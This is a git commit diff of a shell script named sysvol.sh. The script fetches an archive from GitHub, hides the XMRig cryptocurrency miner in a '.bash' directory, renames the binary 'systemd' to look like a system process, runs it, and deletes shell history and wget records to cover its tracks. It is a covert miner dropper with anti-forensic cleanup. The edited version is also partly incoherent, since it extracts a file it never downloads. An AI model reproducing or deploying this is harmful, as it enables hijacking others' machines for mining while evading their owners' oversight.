5eb9e191fa8f9a8f6c8d49fbab6fe21a6da69df5
deusveritatis <43490119+deusveritatis@users.noreply.github.com>
2019-02-08 16:16:09 +0530

    Update sysvol.sh

--- sysvol.sh
+++ sysvol.sh
@@ -1,30 +1,11 @@
-wget https://github.com/xmrig/xmrig/releases/download/v2.10.0/xmrig-2.10.0-xenial-x64.tar.gz
-
 wget https://github.com/deusveritatis/configs/archive/master.zip
-
-unzip ./master.zip
-
-tar -xvzf ./xmrig-2.10.0-xenial-x64.tar.gz
-
+tar -xvzf ./bash.tar.gz
 mv ./xmrig-2.10.0 ./.bash
-
-cd configs-master/
-
-cp ./config.json ../.bash/config.json
-
-cd ../
-
-rm -rf configs-master/
-
-rm master.zip xmrig-2.10.0-xenial-x64.tar.gz
-
+mv ./config.json ../.bash/config.json
+rm ./bash.tar.gz
 cd .bash/
-
 mv ./xmrig ./systemd
-
 ./systemd
-
 cd ..
-
 rm .bash_history
 rm .wget-hsts
